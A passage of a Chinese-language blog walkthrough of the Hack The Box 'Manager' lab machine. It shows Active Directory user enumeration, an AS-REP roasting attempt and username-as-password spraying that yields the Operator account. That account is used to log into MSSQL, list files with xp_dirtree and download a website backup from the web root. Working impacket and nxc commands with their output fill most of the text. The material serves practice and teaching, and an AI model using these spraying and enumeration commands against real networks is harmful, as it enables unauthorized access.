+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             517: MANAGER<span style="color:#ae81ff">\C</span>ert Publishers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             518: MANAGER<span style="color:#ae81ff">\S</span>chema Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             519: MANAGER<span style="color:#ae81ff">\E</span>nterprise Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             520: MANAGER<span style="color:#ae81ff">\G</span>roup Policy Creator Owners <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             521: MANAGER<span style="color:#ae81ff">\R</span>ead-only Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             522: MANAGER<span style="color:#ae81ff">\C</span>loneable Domain Controllers <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             525: MANAGER<span style="color:#ae81ff">\P</span>rotected Users <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             526: MANAGER<span style="color:#ae81ff">\K</span>ey Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             527: MANAGER<span style="color:#ae81ff">\E</span>nterprise Key Admins <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             553: MANAGER<span style="color:#ae81ff">\R</span>AS and IAS Servers <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             571: MANAGER<span style="color:#ae81ff">\A</span>llowed RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             572: MANAGER<span style="color:#ae81ff">\D</span>enied RODC Password Replication Group <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1000: MANAGER<span style="color:#ae81ff">\D</span>C01$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1101: MANAGER<span style="color:#ae81ff">\D</span>nsAdmins <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1102: MANAGER<span style="color:#ae81ff">\D</span>nsUpdateProxy <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1103: MANAGER<span style="color:#ae81ff">\S</span>QLServer2005SQLBrowserUser$DC01 <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1113: MANAGER<span style="color:#ae81ff">\Z</span>hong <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1114: MANAGER<span style="color:#ae81ff">\C</span>heng <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1115: MANAGER<span style="color:#ae81ff">\R</span>yan <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1116: MANAGER<span style="color:#ae81ff">\R</span>aven <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1117: MANAGER<span style="color:#ae81ff">\J</span>inWoo <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1118: MANAGER<span style="color:#ae81ff">\C</span>hinHae <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.56.204   <span style="color:#ae81ff">445</span>    DC01             1119: MANAGER<span style="color:#ae81ff">\O</span>perator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>将暴露出来的用户保存下来，去除掉默认的帐号。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat users.txt
+</span></span><span style="display:flex;"><span>Zhong
+</span></span><span style="display:flex;"><span>Cheng
+</span></span><span style="display:flex;"><span>Ryan
+</span></span><span style="display:flex;"><span>Raven
+</span></span><span style="display:flex;"><span>JinWoo
+</span></span><span style="display:flex;"><span>ChinHae
+</span></span><span style="display:flex;"><span>Operator
+</span></span></code></pre></div><h2 id="as-rep">AS-REP</h2>
+<p>GetNPUsers 不需要任何凭据，只向 KDC 询问哪个帐户关闭了 Kerberos 预认证。七个用户全部要求域认证。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-GetNPUsers manager.htb/ -no-pass -usersfile users.txt -dc-ip 10.129.56.204
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User Zhong doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Cheng doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User Ryan doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User Raven doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User JinWoo doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User ChinHae doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User Operator doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></code></pre></div><p>将用户名首字母修改为小写保存为 <code>passwords.txt</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat passwords.txt
+</span></span><span style="display:flex;"><span>zhong
+</span></span><span style="display:flex;"><span>cheng
+</span></span><span style="display:flex;"><span>ryan
+</span></span><span style="display:flex;"><span>raven
+</span></span><span style="display:flex;"><span>jinwoo
+</span></span><span style="display:flex;"><span>chinhae
+</span></span><span style="display:flex;"><span>operator
+</span></span></code></pre></div><p>用户名当密码是常见的弱口令，可以尝试一下，发现 Operator 的帐号与密码是相同的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.58.202 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Connection Error: The NETBIOS connection with the remote host timed out.
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\C</span>heng:cheng STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\R</span>yan:ryan STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\R</span>aven:raven STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\J</span>inWoo:jinwoo STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\C</span>hinHae:chinhae STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\O</span>perator:operator
+</span></span></code></pre></div><p>列出 Operator 下的共享目录，没有更进一步的发现。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc smb 10.129.58.202 -u Operator -p <span style="color:#e6db74">&#39;operator&#39;</span> --shares
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\O</span>perator:operator
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             IPC$            READ            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             NETLOGON        READ            Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.129.58.202   <span style="color:#ae81ff">445</span>    DC01             SYSVOL          READ            Logon server share
+</span></span></code></pre></div><p>尝试一下 Operator 有没有 WinRM 权限，结果是没有。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm 10.129.58.202 -u Operator -p <span style="color:#e6db74">&#39;operator&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.58.202   <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:manager.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.58.202   <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> manager.htb<span style="color:#ae81ff">\O</span>perator:operator
+</span></span></code></pre></div><h2 id="mssql">MSSQL</h2>
+<p>尝试一下 Operator 有没有MSSQL 权限，登上去了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-mssqlclient manager.htb/Operator:operator@10.129.58.202 -windows-auth
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC01<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC01<span style="color:#ae81ff">\S</span>QLEXPRESS<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM <span style="color:#f92672">(</span>15.0.2000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; 
+</span></span></code></pre></div><h3 id="xp_dirtree">XP_DIRTREE</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; SELECT SYSTEM_USER AS login_name,SUSER_SNAME<span style="color:#f92672">()</span> AS login_display,IS_SRVROLEMEMBER<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sysadmin&#39;</span><span style="color:#f92672">)</span> AS is_sysadmin;
+</span></span><span style="display:flex;"><span>login_name         login_display      is_sysadmin   
+</span></span><span style="display:flex;"><span>----------------   ----------------   -----------   
+</span></span><span style="display:flex;"><span>MANAGER<span style="color:#ae81ff">\O</span>perator   MANAGER<span style="color:#ae81ff">\O</span>perator             <span style="color:#ae81ff">0</span> 
+</span></span></code></pre></div><p>枚举一下数据库。</p>
+<p>四个库都是系统自带的， master 存登录与实例配置，model 是新建库的模版，msdb 放代理作业和备份历史，tempdb 是临时对象。没有任何业务库，意味着这条路在数据层面没有东西可读。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; SELECT name,state_desc FROM sys.databases;
+</span></span><span style="display:flex;"><span>name     state_desc   
+</span></span><span style="display:flex;"><span>------   ----------   
+</span></span><span style="display:flex;"><span>master   ONLINE       
+</span></span><span style="display:flex;"><span>tempdb   ONLINE       
+</span></span><span style="display:flex;"><span>model    ONLINE       
+</span></span><span style="display:flex;"><span>msdb     ONLINE
+</span></span></code></pre></div><p>查询一下权限边界。<code>fn_my_permissions</code> 返回当前登录在指定范围那的有效权限，第一个参数给 NULL 表示服务器级，第二个参数说明查的是服务器范围而不是某个数据库。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; SELECT * FROM fn_my_permissions<span style="color:#f92672">(</span>NULL,<span style="color:#e6db74">&#39;SERVER&#39;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>entity_name   subentity_name   permission_name     
+</span></span><span style="display:flex;"><span>-----------   --------------   -----------------   
+</span></span><span style="display:flex;"><span>server                         CONNECT SQL         
+</span></span><span style="display:flex;"><span>server                         VIEW ANY DATABASE 
+</span></span></code></pre></div><p>只有两个权限，CONNECT SQL 和 VIEW ANY DATABASE，也就是 public 角色的最低档。</p>
+<p>xp_dirtree 是扩展存储的过程，执行权限默认授予 public，所以哪怕是 guest 身份也能调用。它以 SQL 服务帐号权限去读文件系统，能把目录和文件名列出来，但读不了文件内容。三个参数分别的路径、递归深度、是否包含文件。</p>
+<p>枚举一下 C 盘下的文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; EXEC master..xp_dirtree <span style="color:#e6db74">&#39;C:\&#39;</span>,1,0;
+</span></span><span style="display:flex;"><span>subdirectory                depth   
+</span></span><span style="display:flex;"><span>-------------------------   -----   
+</span></span><span style="display:flex;"><span>$Recycle.Bin                    <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Documents and Settings          <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>inetpub                         <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>PerfLogs                        <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Program Files                   <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>             <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>ProgramData                     <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Recovery                        <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>SQL2019                         <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>System Volume Information       <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Users                           <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>Windows                         <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>继续枚举发现 Website 备份文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>MANAGER<span style="color:#ae81ff">\O</span>perator  guest@master<span style="color:#f92672">)</span>&gt; EXEC master..xp_dirtree <span style="color:#e6db74">&#39;C:\inetpub\wwwroot&#39;</span>,1,1;
+</span></span><span style="display:flex;"><span>subdirectory                      depth   file   
+</span></span><span style="display:flex;"><span>-------------------------------   -----   ----   
+</span></span><span style="display:flex;"><span>about.html                            <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>contact.html                          <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>css                                   <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">0</span>   
+</span></span><span style="display:flex;"><span>images                                <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">0</span>   
+</span></span><span style="display:flex;"><span>index.html                            <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>js                                    <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">0</span>   
+</span></span><span style="display:flex;"><span>service.html                          <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>web.config                            <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>   
+</span></span><span style="display:flex;"><span>website-backup-27-07-23-old.zip       <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>backup 文件放在 web 根里，意味着不需要额外权限就能直接下载。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ wget <span style="color:#e6db74">&#34;http://manager.htb/website-backup-27-07-23-old.zip&#34;</span>
+</span></span><span style="display:flex;"><span>--2026-10-19 22:56:02--  http://manager.htb/website-backup-27-07-23-old.zip
+</span></span><span style="display:flex;"><span>Resolving manager.htb <span style="color:#f92672">(</span>manager.htb<span style="color:#f92672">)</span>... 10.129.58.202
+</span></span><span style="display:flex;"><span>Connecting to manager.htb <span style="color:#f92672">(</span>manager.htb<span style="color:#f92672">)</span>|10.129.58.202|:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">1045328</span> <span style="color:#f92672">(</span>1021K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/x-zip-compressed<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘website-backup-27-07-23-old.zip’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>website-backup-27-07-23-old.zip      100%<span style="color:#f92672">[======================================================================</span>&gt;<span style="color:#f92672">]</span>   1021K   511KB/s    in 2.0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-10-19 22:56:04 <span style="color:#f92672">(</span><span style="color:#ae81ff">511</span> KB/s<span style="color:#f92672">)</span> - ‘website-backup-27-07-23-old.zip’ saved <span style="color:#f92672">[</span>1045328/1045328<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah website-backup-27-07-23-old.zip
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552829</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali 1021K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> website-backup-27-07-23-old.zip
+</span></span></code></pre></div><p>解压下来，发现一个 <code>.old-conf.xml</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Manager/Website<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah
+</span></span><span style="display:flex;"><span>total 1.1M
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3551891</span> drwxrwxr-x <span style="color:#ae81ff">5</span> kali kali  4.0K Oct <span style="color:#ae81ff">19</span> 23:01 .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552892</span> drwxrwxr-x <span style="color:#ae81ff">4</span> kali kali  4.0K Oct <span style="color:#ae81ff">19</span> 23:01 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3552863</span> -rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali  5.3K Jul <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2023</span> about.html
